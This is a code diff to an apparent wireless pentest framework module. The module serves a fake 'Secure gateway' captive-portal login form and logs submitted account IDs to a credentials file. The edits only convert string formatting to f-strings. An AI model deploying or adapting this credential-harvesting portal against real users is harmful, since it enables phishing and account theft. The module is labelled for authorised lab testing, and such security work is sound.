@@ -21,7 +21,7 @@ from wirelessxpl.modules.generic.wifi._disclaimer import require_authorised_lab
 def _html_shell(title: str, inner: str) -> bytes:
     """Build full HTML5 document with modern neutral styling (inline CSS only)."""
 
-    page = """<!DOCTYPE html>
+    page = f"""<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="utf-8"/>
@@ -72,7 +72,7 @@ def _html_shell(title: str, inner: str) -> bytes:
     {inner}
   </main>
 </body>
-</html>""".format(title=title, inner=inner)
+</html>"""
     return page.encode("utf-8")
 
 
@@ -116,10 +116,10 @@ class Exploit(Exploit):
         cred_path = str(self.credentials_log).strip() or "wxf_captive_submits.ndjson"
         title = str(self.portal_title)
         subtitle = str(self.portal_subtitle)
-        inner_form = """
+        inner_form = f"""
     <div class="badge"><span class="dot" aria-hidden="true"></span> Secure gateway</div>
-    <h1>{h1}</h1>
-    <p class="sub">{sub}</p>
+    <h1>{title}</h1>
+    <p class="sub">{subtitle}</p>
     <form method="post" action="/portal" autocomplete="on">
       <label for="identity">Email or account ID</label>
       <input id="identity" name="identity" type="text" inputmode="email" autocomplete="username" required/>
@@ -128,7 +128,7 @@ class Exploit(Exploit):
       <button type="submit">Continue</button>
     </form>
     <p class="fine">This page is for authorised penetration-test labs only. Misuse may violate criminal law.</p>
-        """.format(h1=title, sub=subtitle)
+        """
 
         inner_done = """
     <div class="badge"><span class="dot" aria-hidden="true"></span> Completed</div>
@@ -208,7 +208,7 @@ class Exploit(Exploit):
 
         host = str(self.listen_host)
         port = int(self.listen_port)
-        print_success("Captive UI on http://{}:{}  (log -> {})".format(host, port, cred_path))
+        print_success(f"Captive UI on http://{host}:{port}  (log -> {cred_path})")
         print_status("Ctrl+C to stop.")
         try:
             httpd = ThreadingHTTPServer((host, port), Handler)
